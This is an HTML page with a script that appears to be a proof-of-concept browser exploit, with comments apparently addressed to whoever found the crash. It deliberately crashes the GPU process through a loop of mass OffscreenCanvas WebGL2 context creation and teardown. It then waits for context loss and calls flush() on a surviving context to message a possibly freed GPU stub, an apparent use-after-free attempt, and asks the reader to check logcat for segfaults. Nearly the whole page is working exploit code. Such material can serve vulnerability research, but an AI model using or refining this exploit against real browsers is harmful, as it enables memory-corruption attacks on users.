<html>
<body>
<pre id="log"></pre>
<script>
const log = msg => {
  document.getElementById('log').textContent += msg + '\n';
  console.log(msg);
};

(async function() {
  // 1. Create a WebGL context that we will keep alive
  const keepAliveCanvas = document.createElement('canvas');
  keepAliveCanvas.width = 1; keepAliveCanvas.height = 1;
  document.body.appendChild(keepAliveCanvas);
  const glKeep = keepAliveCanvas.getContext('webgl2', { preserveDrawingBuffer: true });
  if (!glKeep) return log('WebGL2 not available');
  log('Keep-alive context created.');

  // 2. Crash the GPU using YOUR ORIGINAL WORKING METHOD
  //    (huge OffscreenCanvas + WebGL2 + immediate teardown)
  function crashGPU() {
    // Same loop that you confirmed causes exit_code=0 crash
    const attrs = [
      { powerPreference: 'high-performance' },
      { powerPreference: 'low-power' },
      { desynchronized: true },
      { preserveDrawingBuffer: true },
      { failIfMajorPerformanceCaveat: false },
      { xrCompatible: true }
    ];
    // Run enough iterations to kill the GPU – no setTimeout needed,
    // the synchronous loop will eventually trigger WaitForGetOffsetInRange.
    for (let w = 1; w <= 16384; w *= 2) {
      for (let h = 1; h <= 16384; h *= 2) {
        for (const attr of attrs) {
          try {
            const canvas = new OffscreenCanvas(w, h);
            const gl = canvas.getContext('webgl2', attr);
            if (!gl) continue;
            gl.clear(gl.COLOR_BUFFER_BIT);
            gl.flush();
            // Tear down immediately – this stresses the command buffer
            canvas.width = 0;
            canvas.height = 0;
          } catch(e) {}
        }
      }
    }
  }
  log('Crashing GPU (your original method)...');
  crashGPU(); // This is synchronous; it will finish quickly

  // 3. Wait until the GPU process is dead
  //    We poll glKeep.isContextLost() – when the GPU dies, all contexts are lost.
  while (!glKeep.isContextLost()) {
    await new Promise(r => setTimeout(r, 50));
  }
  log('GPU context lost – browser is cleaning up.');

  // 4. Give the browser a tiny head‑start to begin freeing the stub,
  //    then send a message on the still‑alive pipe.
  await new Promise(r => setTimeout(r, 10)); // tune 0–50ms

  log('Sending gl.flush() on the old context...');
  try {
    glKeep.flush();  // This attempts to send a Mojo message to the (maybe freed) stub
  } catch(e) {
    log('Exception: ' + e.message);
  }
  log('Done. Check logcat for browser crash (SIGSEGV, DCHECK, or "Goodbye").');
})();
</script>
</body>
</html>
